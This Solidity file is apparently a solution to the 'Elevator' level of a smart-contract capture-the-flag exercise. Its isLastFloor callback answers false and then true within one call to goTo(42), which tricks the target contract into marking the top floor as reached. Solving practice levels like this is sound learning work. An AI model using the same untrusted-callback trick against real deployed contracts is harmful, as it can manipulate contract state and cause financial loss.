// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./level.sol";

contract Solution {
    Elevator elevator;

    constructor(address _addr) public {
        elevator = Elevator(_addr);
    }

    function isLastFloor(uint256) external returns (bool) {
        return elevator.floor() == 42;
    }

    function solve() public {
        elevator.goTo(42);
    }
}
